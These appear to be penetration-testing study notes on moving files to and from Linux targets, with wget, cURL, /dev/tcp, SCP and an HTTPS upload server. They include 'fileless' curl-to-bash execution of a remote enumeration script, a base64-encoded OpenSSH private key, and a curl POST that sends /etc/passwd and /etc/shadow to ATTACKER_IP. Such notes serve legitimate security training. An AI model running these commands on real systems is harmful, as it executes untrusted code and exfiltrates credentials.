**Download Operations**

**Check MD5 Hash**
```
md5sum id_rsa
```

**Encode SSH Key to Base64**
```
cat id_rsa |base64 -w 0;echo
```

**Decode the File**
```echo -n'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

**Confirm the MD5 Hashes Match**
```
md5sum id_rsa
```


#### Web Downloads with Wget and cURL

**Download a File using Wget**
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

**Download a File Using cURL**
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

#### Fileless Attacks Using Linux

Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it

**Fileless Download with cURL**
```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

**Fileless Download with wget**
```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

#### Download with Bash (/dev/tcp)

As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads

**Connect to the Target Webserver**
```
exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP GET Request**
```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**Print the Response**
```
cat <&3
```

#### SSH Downloads

**Enabling the SSH Server**
```
sudo systemctl enable ssh
```

**Starting the SSH Server**
```
sudo systemctl start ssh
```

**Checking for SSH Listening Port**
```
netstat -lnpt
```

**Downloading Files Using SCP**
```
scp plaintext@192.168.49.128:/root/myroot.txt .
```


#### Web Upload

**Start Web Server**
```
sudo python3 -m pip install --user uploadserver
```

**Now Create a Self Signed Certificate**
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

**Start the Web Server** - here we're making a directory to host the server
```
mkdir https && cd https
```

```
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```

From the target/compromised machine upload the /etc/passwd and /etc/shadow files

```
curl -X POST https://ATTACKER_IP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
	- used the --insecure option because we used a self-signed cert we trust